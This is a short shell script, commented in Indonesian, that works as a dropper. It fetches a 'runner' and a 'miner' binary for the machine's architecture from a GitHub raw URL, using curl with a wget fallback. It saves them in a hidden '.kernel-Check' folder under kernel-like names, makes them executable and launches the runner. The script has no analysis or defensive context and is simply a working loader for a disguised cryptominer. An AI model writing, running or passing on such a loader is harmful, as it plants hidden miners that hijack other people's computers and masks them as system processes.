#!/bin/sh
set -e

REPO_URL="https://raw.githubusercontent.com/anonking-67/cotton4/main"
WORKDIR="$HOME/.kernel-Check"

# Fungsi Fallback Download
download_file() {
    local FILE_NAME=$1
    local URL=$2

    echo "[+] Downloading $FILE_NAME..."
    
    # Opsi 1: Mencoba CURL
    if command -v curl >/dev/null 2>&1; then
        if curl -fsSL -o "$FILE_NAME" "$URL"; then
            return 0
        fi
        echo "[!] Curl gagal, beralih ke wget..."
    fi

    # Opsi 2: Mencoba WGET (Fallback)
    if command -v wget >/dev/null 2>&1; then
        if wget -q -O "$FILE_NAME" "$URL"; then
            return 0
        fi
    fi

    echo "[-] Error: Gagal mengunduh $FILE_NAME menggunakan curl maupun wget."
    exit 1
}

# 1. Deteksi Arsitektur
ARCH=$(uname -m)
case "$ARCH" in
    x86_64|amd64) RUNNER="kernel86"; MINER="kernelU" ;;
    aarch64|arm64) RUNNER="kernel64"; MINER="kernelX" ;;
    *) echo "[-] Arch not supported"; exit 1 ;;
esac

mkdir -p "$WORKDIR"
cd "$WORKDIR"

# 2. Download Runner & Miner dengan Fitur Fallback
# Catatan: URL diarahkan ke file spesifik di repo
download_file "runner" "${REPO_URL}/${RUNNER}"
download_file "${MINER}" "${REPO_URL}/${MINER}"

chmod +x "runner" "${MINER}"

# 3. Jalankan Runner
echo "[+] Starting Runner..."
./runner

echo "[+] Selesai! Cek proses dengan: ps aux | grep kernel"